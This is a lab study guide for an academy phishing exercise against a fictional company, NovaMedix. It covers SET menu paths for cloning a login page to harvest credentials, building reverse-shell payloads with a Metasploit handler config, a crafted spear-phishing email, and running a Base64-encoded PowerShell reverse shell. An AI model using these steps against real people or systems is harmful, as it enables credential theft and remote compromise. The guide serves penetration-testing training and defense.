# Social Engineering Operations

> A practical SET reference for the NovaMedix academy project: reconnaissance, email authentication, credential harvesting, payloads, spear phishing, PowerShell, campaign metrics, and reporting.

`Use the fictional company, assigned machines, test mailboxes, and dummy credentials. Addresses, messages, and outputs below are illustrative, not results from an executed assessment.`

## 1. The NovaMedix Attack Chain

NovaMedix protects sensitive clinical-trial data but has not tested employees' reactions to targeted messages. Demonstrate the chain and identify which controls prevent or detect each stage.

| Stage | Action | Evidence |
|---|---|---|
| Reconnaissance | Identify recipient role and work context | Relevant facts and sources |
| Email assessment | Inspect SPF, DKIM, DMARC, and headers | DNS responses and received authentication results |
| Preparation | Clone the lab portal and generate the assigned payload | SET settings and generated files |
| Delivery | Send a tailored email through SET | Message, SMTP result, and received copy |
| Interaction | Observe link visits and dummy submissions | Browser requests and harvester output |
| Execution | Run the assigned payload on the lab endpoint | Process, callback, and session evidence |
| Assessment | Interpret GoPhish results and report findings | Metrics, limitations, recommendations |

**Capturing a password does not automatically open a reverse shell.** A payload must execute on an endpoint and reach a compatible listener. Document the delivery and execution step connecting these events.

The exact academy task pages were not supplied. This guide follows the provided project description and learning objectives; use the academy's required filenames and submission formats when available.

## 2. Social Engineering and Human Behavior

**Social engineering** manipulates a person into revealing information or performing an unsafe action. It exploits trust and decisions rather than relying only on software vulnerabilities.

| Term | Meaning | NovaMedix example |
|---|---|---|
| Phishing | Deceptive message asking someone to act | Generic account warning |
| Spear phishing | Phishing tailored to a person or organization | Trial-document request aimed at a coordinator |
| Pretext | Story that justifies the request | Scheduled document review |
| Credential harvesting | Capturing values entered into a misleading form | Cloned portal recording dummy credentials |
| Payload | Code that performs an action when executed | Lab reverse-shell program |
| Listener / handler | Service receiving a payload connection | Matching receiver on Kali |

Common triggers are **authority** (IT or a manager), **urgency** (a deadline), **fear** (losing access), **familiarity** (normal company wording), and **curiosity** (a new document).

Explain each pretext using four points: claimed identity, reason it seems believable, requested action, and verification step the recipient overlooks.

A spear-phishing message can be sent to one person with a module called Mass Mailer. Its targeting and content determine whether it is spear phishing, not the module name.

## 3. Reconnaissance

Use the fictional company profile and assigned recipients to build a relevant work context.

| Information | Why it matters |
|---|---|
| Recipient name and role | Relevant greeting and requested action |
| Department and workflow | Believable document or task |
| Email format | Expected sender/recipient structure |
| Portal and domain names | Compare legitimate and misleading identities |
| Communication conventions | Recognize normal signatures and requests |

Illustrative notes:

```text
Recipient: alex@novamedix.test
Role: clinical-trial coordinator
Normal activity: reviewing trial documents
Pretext: document ready for review
Source: fictional company profile provided with the lab
```

These are synthetic examples. Present only actually collected observations as reconnaissance results.

## 4. SPF, DKIM, and DMARC

These mechanisms evaluate email domain identities. They do not guarantee that a message is harmless.

| Mechanism | What it checks | Remember |
|---|---|---|
| **SPF** | Is the sending IP authorized for the envelope sender's domain? | Normally checks SMTP `MAIL FROM`, not visible `From:` |
| **DKIM** | Is the message's domain signature valid? | `d=` identifies the signer; `s=` identifies its DNS selector |
| **DMARC** | Does passing SPF or DKIM align with the visible `From:` domain? | At least one aligned pass is enough |

**Alignment** means the authenticated domain matches the author domain under the strict or relaxed rule. SPF passing for an unrelated domain does not authenticate a forged NovaMedix author address.

### DNS checks on Kali

Replace reserved example names with the assigned domain. `.test` names need the lab's DNS configuration.

```bash
dig TXT novamedix.test +short
dig TXT _dmarc.novamedix.test +short
dig TXT selector1._domainkey.novamedix.test +short
```

`TXT` selects text records. `+short` reduces output formatting. Use the real `s=` selector from a received DKIM signature instead of assuming `selector1`.

Illustrative SPF record:

```text
"v=spf1 ip4:192.0.2.25 -all"
```

It authorizes the documentation IP `192.0.2.25`. `-all` produces fail for other senders; `~all` means softfail. `+all` authorizes every IP and undermines the restriction.

Illustrative DMARC record:

```text
"v=DMARC1; p=none; rua=mailto:dmarc@novamedix.test"
```

| Policy | Requested handling of DMARC failures |
|---|---|
| `p=none` | Monitor without requesting quarantine or rejection |
| `p=quarantine` | Treat suspiciously, commonly by sending to spam |
| `p=reject` | Reject |

The receiver makes the final handling decision. DNS policy is configuration evidence; received-message evidence establishes actual handling.

### Received-header interpretation

```text
From: NovaMedix IT <it@novamedix.test>
Return-Path: <sender@mailer.example>
Authentication-Results: mx.receiver.example;
 spf=pass smtp.mailfrom=mailer.example;
 dkim=pass header.d=mailer.example;
 dmarc=fail header.from=novamedix.test
```

SPF and DKIM pass for `mailer.example`, but neither aligns with `novamedix.test`, so DMARC fails. Trust results added by your receiving system, not an arbitrary sender-supplied authentication header.

Sources: [SPF specification](https://www.rfc-editor.org/rfc/rfc7208), [DKIM specification](https://www.rfc-editor.org/rfc/rfc6376), [DMARC specification](https://www.rfc-editor.org/rfc/rfc9989.html).

## 5. Email Spoofing and Typosquatting

**Email spoofing** makes a message appear to come from a different sender. In SET's mailer, display name and `From:` fields affect the identity shown to the recipient; SMTP and receiving controls can reject or rewrite them.

| Technique | Example | Misleading element |
|---|---|---|
| Display-name spoofing | `NovaMedix IT <sender@example.test>` | Trusted name, different address |
| Domain spoofing | Unauthorized sender claims `it@novamedix.test` | Claimed author domain |
| Typosquatting | `novarnedix.test` instead of `novamedix.test` | `rn` resembles `m` |
| Misleading subdomain | `novamedix.test.portal.example` | Trusted text inside another domain |

A lookalike domain can pass SPF, DKIM, and DMARC for its own domain. That does not make it the real NovaMedix domain.

Spoofing supports the pretext; it does not automatically bypass spam filters, encrypt mail, or give access to the impersonated mailbox.

## 6. Install SET and Prepare the Lab

The **Social-Engineer Toolkit (SET)** is an open-source penetration-testing framework focused on social engineering. **David Kennedy**, founder of **TrustedSec**, created it. TrustedSec is the project organization.

### Install and launch on Kali

```bash
sudo apt update
sudo apt install set
dpkg-query -W set
sudo setoolkit
```

| Command | Purpose |
|---|---|
| `sudo apt update` | Refresh package information |
| `sudo apt install set` | Install Kali's package named `set` |
| `dpkg-query -W set` | Record the installed version |
| `sudo setoolkit` | Launch SET with root privileges |

The normal Kali workflow requires **root**, supplied through `sudo`. This is the tool's privilege on Kali; it does not make a target session an administrator.

Sources: [TrustedSec overview](https://trustedsec.com/resources/tools/the-social-engineer-toolkit-set), [Kali SET documentation](https://www.kali.org/tools/set/).

### Keep lab addresses clear

| Component | Illustrative value | Purpose |
|---|---|---|
| Kali / SET | `192.168.56.10` | Cloned page and callback destination |
| Windows endpoint | `192.168.56.20` | Test browser and payload execution |
| Source website | `http://192.168.56.30/` | Page SET copies |
| SMTP server | `192.168.56.40` | Lab email delivery |
| Callback port | `4444` | Payload-to-listener connection |

These are example assignments, not existing services. Use actual addresses from the designated isolated lab. On Apple Silicon, verify Windows VM and payload architecture compatibility; Kali's architecture does not determine the target payload architecture.

```bash
ip -br addr
ip route get 192.168.56.20
```

`ip -br addr` briefly lists interface addresses. `ip route get` shows the route and source address toward the endpoint; a field such as `src 192.168.56.10` identifies that source.

`127.0.0.1` on the endpoint means the endpoint itself. `0.0.0.0` is a listener bind wildcard, not a destination to embed in another VM's callback.

## 7. SET Menu Map

Choose **1) Social-Engineering Attacks** from the main menu. These options are then inside its submenu:

| Choice | Module | Project purpose |
|---|---|---|
| **1** | Spear-Phishing Attack Vectors | Separate file-format/template workflows |
| **2** | Website Attack Vectors | Reach Credential Harvester |
| **4** | Create a Payload and Listener | Generate payload and handler |
| **5** | Mass Mailer Attack | Send project email |
| **9** | PowerShell Attack Vectors | Generate PowerShell content |
| **99** | Return | Go back |

Paths starting from SET's main menu:

| Task | Choices | Labels |
|---|---|---|
| Clone login page | **1 → 2 → 3 → 2** | Social-Engineering → Website → Credential Harvester → Site Cloner |
| Generate payload | **1 → 4** | Social-Engineering → Create a Payload and Listener |
| Send email | **1 → 5 → 1** | Social-Engineering → Mass Mailer → Single Email Address |
| PowerShell options | **1 → 9** | Social-Engineering → PowerShell Attack Vectors |

Use numbers and labels together. If your release differs, follow its displayed labels.

Source: [SET menu definitions](https://github.com/trustedsec/social-engineer-toolkit/blob/master/src/core/menu/text.py).

## 8. Credential Harvester: Clone and Capture

**Purpose:** host a copy of the lab login page and record submitted form values. This is harvesting, not password cracking.

### Select the workflow

1. Launch `sudo setoolkit`.
2. Choose **1) Social-Engineering Attacks**.
3. Choose **2) Website Attack Vectors**.
4. Choose **3) Credential Harvester Attack Method**.
5. Choose **2) Site Cloner**.

### Enter the values

| Prompt meaning | Example | Reason |
|---|---|---|
| IP for POST-back | `192.168.56.10` | Form data returns to Kali |
| Website to clone | `http://192.168.56.30/` | Source page, not callback destination |
| NAT/forwarding, if asked | Match the lab topology | Same-network VMs normally need no external forwarding |

Read SET's printed listener address and port. From Windows, open the **copy on Kali**, such as `http://192.168.56.10/` when SET uses HTTP port 80.

Submit assigned dummy values. Simplified illustrative capture:

```text
username=alex.lab
password=NovaMedix-Lab-Only!
```

This proves those values reached the harvester. It does not prove the password works elsewhere or that MFA was bypassed.

### Find evidence

Common root-run locations include `/root/.set/web_clone/` for the page and `/root/.set/reports/` for module reports. Logging can use installation logs or Apache's directory instead. Follow paths printed by the run.

```bash
sudo ls -lah /root/.set/web_clone/
sudo ls -lah /root/.set/reports/
```

`ls -lah` lists hidden entries, permissions, timestamps, and readable sizes. Save a redacted capture with its timestamp.

If the page displays but captures nothing, inspect form action, browser POST, and field names. JavaScript-heavy pages and external single sign-on may not become working local forms.

Source: [SET harvester implementation](https://github.com/trustedsec/social-engineer-toolkit/blob/master/src/webattack/harvester/harvester.py).

## 9. Create a Payload and Listener

A **reverse shell** connects outward from the endpoint to Kali. A **bind shell** listens on the endpoint. **Meterpreter** provides a Metasploit agent interface rather than an ordinary command prompt.

### Generate through SET

1. Choose **1 → 4**, Create a Payload and Listener.
2. Select the assigned payload matching endpoint OS and architecture.
3. Enter callback IP / **LHOST**, for example `192.168.56.10`.
4. Enter callback port / **LPORT**, for example `4444`.
5. Record payload name and generated file path.
6. Start the matching listener when offered, before endpoint execution.

| Setting | Meaning |
|---|---|
| `PAYLOAD` | Specific payload type; handler must match |
| `LHOST` | Callback destination embedded in this lab payload |
| `LPORT` | Callback destination port, matching the listener |

**`4444` is the common training answer and example used here.** The port is configurable. Some SET workflows offer other defaults, including `443`; read the actual prompt.

### Understand meta_config

In the classic Metasploit-backed workflow, **`/root/.set/meta_config`** contains handler commands. It is a **listener resource/configuration file**, not the payload executable. Other backends may generate different artifacts.

```bash
sudo cat /root/.set/meta_config
```

Illustrative contents for one specific payload:

```text
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.56.10
set LPORT 4444
exploit -j
```

`exploit/multi/handler` receives the matching Metasploit payload. `exploit -j` starts it as a background job. This is not a universal handler configuration for every SET payload.

If SET has not already started the handler, load the generated resource file:

```bash
sudo msfconsole -r /root/.set/meta_config
```

`-r` reads a resource file. Avoid a second listener on an occupied port. The executable/script is separate: use SET's printed output path.

File generation does not prove execution. Look for an endpoint process, callback, and successful command response.

Source: [SET module dispatcher](https://github.com/trustedsec/social-engineer-toolkit/blob/master/src/core/set.py). Exact payload names and artifacts depend on the installed release.

## 10. Send Spear Phishing with Mass Mailer

**Purpose:** deliver a tailored NovaMedix message to the assigned lab mailbox through the configured SMTP server.

### Select and configure

1. Choose **1) Social-Engineering Attacks → 5) Mass Mailer Attack**.
2. Choose **1) E-Mail Attack Single Email Address** for the first test.
3. Select **One-Time Use Email Template** to write interactively.
4. Supply subject and plain-text/HTML body. Where requested, finish with `END` on its own line.
5. Enter the assigned recipient.
6. Select your lab SMTP server; supply address, port, and required credentials.
7. Enter the exercise's sender address and display name.
8. Add the controlled page link or task-required attachment, verify destinations, and complete delivery.

Prompt order varies. “Use your own server or open relay” is a menu label: use the provided lab server. Common SMTP ports include `25` for relay and `587` for authenticated submission; your configured server determines port and TLS requirements.

### Fictional message

```text
From: NovaMedix Document Review <review@novamedix.test>
To: alex@novamedix.test
Subject: Trial document ready for your review

Hi Alex,

The revised trial document is ready for the coordinator review.
Please check it before our next team meeting:

http://192.168.56.10/

Thanks,
Document Review Team
NovaMedix
```

Role-specific work makes this spear phishing. Company identity supplies familiarity; the meeting supplies a deadline. A visible lab IP makes the destination easy to trace in class.

For endpoint execution, use the assigned payload and host. Opening email does not automatically execute its `.ps1` or `.exe` attachment. Record the action that actually starts execution.

### Interpret delivery

SMTP acceptance means the server accepted a message for processing. Verify mailbox arrival and inspect full headers, quarantine, and filtering. SET constructing a spoofed sender does not guarantee receiver acceptance.

SET delivery does not automatically create GoPhish metrics. Attribute results to the tool and run that produced them.

Source: [SET Mass Mailer implementation](https://github.com/trustedsec/social-engineer-toolkit/blob/master/src/phishing/smtp/client/smtp_web.py).

## 11. PowerShell Payloads and Encoding

**PowerShell** is a Windows shell and scripting environment. **`.ps1`** identifies a script file. An **encoded command** represents command text as Base64; encoding is separate from filename.

### Generate with SET

Choose **1 → 9**, PowerShell Attack Vectors. Traditional options include:

| Choice | Label | Purpose |
|---|---|---|
| **1** | Powershell Alphanumeric Shellcode Injector | PowerShell shellcode/encoded-launcher workflow |
| **2** | Powershell Reverse Shell | Generate a PowerShell reverse-shell script |
| **3** | Powershell Bind Shell | Generate a script listening on the target |
| **4** | Powershell Dump SAM Database | Credential-database workflow, outside this shell exercise |

For the basic reverse shell, choose **2**, supply Kali's reachable IP and selected port, then start the compatible listener when prompted. For an explicitly required encoded/injection workflow, inspect **1** and match payload and architecture.

Outputs commonly go under `/root/.set/reports/powershell/`. Read the printed path. Some versions export script/launcher content as `.txt`; SET does not always create a ready-to-run encoded `.ps1`.

```bash
sudo ls -lah /root/.set/reports/powershell/
```

Inspect what was generated:

- **Script body:** can be saved as the task's `.ps1` file.
- **`powershell.exe ... -EncodedCommand ...` launcher:** a command invoking PowerShell; not every output file is itself Base64.
- **Shellcode:** needs its intended loader and handler. A plain TCP listener is not interchangeable with a Meterpreter handler.

Source: [SET PowerShell menu definitions](https://github.com/trustedsec/social-engineer-toolkit/blob/master/src/core/menu/text.py). Exported filenames must be confirmed in the actual lab; they were not runtime-validated while preparing this guide.

### Encode a SET-generated script

If the task requires an encoded reverse-shell command and SET produced a **PowerShell script body**, save the reviewed body on the assigned Windows endpoint as `novamedix-lab.ps1`. In Windows PowerShell:

```powershell
$script = Get-Content -Raw .\novamedix-lab.ps1
$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
$encoded = [Convert]::ToBase64String($bytes)

# Verify that decoding reproduces the original script.
[System.Text.Encoding]::Unicode.GetString(
    [Convert]::FromBase64String($encoded)
) -eq $script
```

`-Raw` reads one string. Here `.NET Encoding.Unicode` produces **UTF-16LE**, required by Windows PowerShell's `-EncodedCommand`. The comparison should print `True`; that checks a round trip, not safety or execution success.

With the corresponding listener running, execute the task's script on the lab endpoint:

```powershell
powershell.exe -NoProfile -EncodedCommand $encoded
```

`-NoProfile` avoids profile scripts. `-EncodedCommand` decodes and executes the text. This step encodes the SET-generated script; it does not claim SET's reverse-shell option automatically encoded it.

**Base64 is encoding, not encryption.** It does not guarantee antivirus evasion, bypass application control, or grant administrator privileges. If execution is blocked, preserve the alert as a result.

Source: [Microsoft Windows PowerShell parameters](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1).

## 12. Session Validation and Troubleshooting

Verify a session with a small command and response.

| Interface | Verification | Establishes |
|---|---|---|
| Windows command shell | `whoami`, then `hostname` | Executing user and host |
| PowerShell | `whoami`, then `$env:COMPUTERNAME` | Executing user and host |
| Meterpreter | `getuid`, then `sysinfo` | Agent identity and system |

Illustrative output:

```text
C:\Users\LabUser>whoami
novamedix-lab\labuser

C:\Users\LabUser>hostname
NOVAMEDIX-LAB
```

This supports command execution under that identity on the lab endpoint. It does not prove administrator access or access to clinical records. Record the timestamp and close the session after the required proof.

### Check Kali's listeners

```bash
sudo ss -lntp
```

`-l` selects listeners, `-n` shows numeric addresses/ports, `-t` selects TCP, and `-p` shows processes. A local listening socket does not prove reachability from the endpoint.

| Problem | Check first |
|---|---|
| SET requires root | `sudo setoolkit` |
| Page unreachable | Kali address, VM network, printed port, listener |
| Page loads, no capture | Form action, POST request, field names, logs |
| SMTP failure | Server, port, credentials, TLS/authentication support, receiver trace |
| Port occupied | Existing process in `ss`; avoid duplicate listeners |
| No payload callback | Execution, OS/architecture, callback IP/port, route, firewall logs |
| Connection but no shell | Payload/handler protocol match and command response |
| Missing `meta_config` | Backend, generation errors, printed output location |
| PowerShell output is `.txt` | Inspect whether it contains script body or launcher |
| Encoded command fails | UTF-16LE, quoting, decoded instructions |

Change one setting at a time. A blocked payload is a meaningful control result; do not disable protections merely to force a successful demonstration.

## 13. GoPhish Campaign Metrics

GoPhish manages and measures phishing campaigns. SET remains the main practical tool here. Campaign interactions do not prove a reverse shell.

The components are **Users & Groups**, **Email Templates**, **Landing Pages**, **Sending Profiles**, and **Campaigns**. Templates use `{{.URL}}` for tracked links. A recipient-specific `rid` selects the landing page; visiting without it may return 404.

| Metric | Meaning | Limitation |
|---|---|---|
| Email Sent | Tool/SMTP sending succeeded | Not guaranteed inbox placement |
| Email Opened | Tracking-image request observed | Image blocking and automated fetching distort it |
| Clicked Link | Tracked URL requested | Security scanners can request links |
| Submitted Data | Form submitted with capture configured | Not automatically valid credentials or an executed payload |
| Email Reported | Reporting recorded through configured mechanism | Requires integration or separate evidence |

Count **unique recipients** for recipient rates. State the denominator. Example: 50 SMTP-accepted recipients, 30 tracked opens, 12 clickers, 4 dummy submitters, 10 reporters.

| Calculation | Result |
|---|---|
| Open rate: `30 / 50 × 100` | **60%** |
| Click rate: `12 / 50 × 100` | **24%** |
| Submission rate: `4 / 50 × 100` | **8%** |
| Click-to-submit: `4 / 12 × 100` | **33.3%** |
| Reporting rate: `10 / 50 × 100` | **20%** |

These figures are invented. Groups can overlap: a recipient may click and later report. A zero denominator means the rate is not applicable.

Captured GoPhish credentials are stored in plaintext. Use dummy values and redact report evidence. Disabling **Capture Passwords** does not stop capture of other configured fields.

For response readiness, measure **time to first report**, **time to detection**, and **time from detection to containment**. Identify each starting event.

Sources: [GoPhish campaigns](https://docs.getgophish.com/user-guide/documentation/campaigns), [landing pages](https://docs.getgophish.com/user-guide/documentation/landing-pages), [reporting](https://docs.getgophish.com/user-guide/documentation/email-reporting).

## 14. Professional Reporting

| Section | Include |
|---|---|
| Executive summary | Objective, strongest observed result, business relevance |
| Scope/environment | Assigned recipients/hosts, dates, network, versions |
| Method | Recon, email checks, SET modules, delivery/execution sequence |
| Findings/evidence | Screenshots/logs, timestamps, settings, reproduction |
| Campaign results | Counts/rates, denominators, tracking limitations |
| Recommendations | Controls linked to observed weaknesses |
| Retest/cleanup | How to verify fixes; artifacts/services removed |

For each finding:

```text
Title:
Affected host/domain/control:
Observed result:
Evidence and timestamp:
Reproduction steps:
Impact supported by evidence:
Recommendation:
Retest condition:
```

Example wording, only if both events were observed:

> The test recipient submitted assigned dummy credentials to the cloned lab portal. Separately, the assigned payload executed on the Windows lab endpoint, and the listener received a session returning the expected username and hostname.

A click supports a click finding, not “clinical-trial data compromised.” Distinguish potential impact from demonstrated actions.

## 15. Defenses and Completion

| Stage | Controls | Retest evidence |
|---|---|---|
| Sender impersonation | SPF/DKIM, DMARC enforcement, impersonation detection | Controlled spoof rejected/quarantined; legitimate mail works |
| Misleading link/domain | Domain inspection, URL filtering, independent verification | Destination blocked or reported |
| Credential harvesting | Phishing-resistant MFA, password managers, clear login procedures | Fake origin cannot complete protected sign-in |
| Payload execution | Least privilege, application control, endpoint protection | Block or actionable alert |
| Reverse connection | Egress restrictions, network monitoring | Callback blocked or detected |
| Human response | Simple reporting, practiced incident response | Timely report, investigation, containment |

Password managers help users notice unexpected origins. Ordinary OTP-based MFA can be relayed; properly implemented FIDO2/WebAuthn provides origin-bound phishing resistance.

Save the required evidence, stop lab mail/page/listener services, remove payloads and dummy captured data according to task retention rules, and confirm ports are closed. Leaving SET can leave Apache-backed pages running; check the service explicitly.

### Learning-objective coverage

| Objective | Study section |
|---|---|
| Social engineering and human behavior | 1–3 |
| SPF, DKIM, DMARC | 4 |
| SET usage/navigation | 6–7 |
| Clone and harvest dummy credentials | 8 |
| Generate payload/listener | 9 and 12 |
| Craft/send spear phishing through Mass Mailer | 10 |
| Spoofing and typosquatting | 5 |
| Encoded PowerShell | 11 |
| GoPhish metrics | 13 |
| Professional report | 14 |
| Defensive measures | 15 |

### References and version notes

Documentation reviewed **26 October 2026**. The supplied quiz informed coverage; its questions and answer key are not reproduced. Commands and illustrative outputs were not executed while preparing this guide. Confirm generated artifact names and individual payload options against the installed release.

- [TrustedSec SET overview](https://trustedsec.com/resources/tools/the-social-engineer-toolkit-set)
- [Official SET repository](https://github.com/trustedsec/social-engineer-toolkit)
- [Kali SET installation and usage](https://www.kali.org/tools/set/)
- [SET menu source](https://github.com/trustedsec/social-engineer-toolkit/blob/master/src/core/menu/text.py)
- [SET user manual](https://github.com/trustedsec/social-engineer-toolkit/blob/master/readme/User_Manual.pdf), older screenshots: compare with installed menus
- [GoPhish campaigns](https://docs.getgophish.com/user-guide/documentation/campaigns)
- [GoPhish landing pages](https://docs.getgophish.com/user-guide/documentation/landing-pages)
- [SPF: RFC 7208](https://www.rfc-editor.org/rfc/rfc7208)
- [DKIM: RFC 6376](https://www.rfc-editor.org/rfc/rfc6376)
- [DMARC: RFC 9989](https://www.rfc-editor.org/rfc/rfc9989.html)
- [Microsoft Windows PowerShell parameters](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1)

